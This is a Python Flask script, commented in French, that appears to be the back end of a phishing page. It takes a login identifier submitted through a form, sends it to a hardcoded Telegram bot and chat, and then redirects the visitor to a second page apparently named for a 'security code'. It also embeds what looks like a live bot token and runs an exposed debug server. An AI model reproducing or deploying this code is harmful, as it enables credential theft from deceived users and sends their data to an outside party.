from flask import Flask, render_template, request, redirect
import requests

# Créer une instance Flask
app = Flask(__name__)

# Remplace par ton vrai token Telegram
TOKEN = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A'
# Remplace par ton ID de chat Telegram
CHAT_ID = '6297861735'

def send_to_telegram(text):
    """Fonction pour envoyer un message à Telegram."""
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    response = requests.post(url, data={'chat_id': CHAT_ID, 'text': text})
    print(response.status_code)
    print(response.text)

@app.route('/', methods=['GET', 'POST'])
def index():
    """Page principale avec le formulaire."""
    if request.method == 'POST':
        identifiant = request.form['identifiant']  # Récupère l'identifiant du formulaire
        send_to_telegram(f"Identifiant : {identifiant}")  # Envoie à Telegram
        return redirect("https://code-s-curit.onrender.com/")  # Redirige vers le site
    return render_template('index.html')  # Rends le formulaire de la page

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000, debug=True)  # Lance l'application Flask
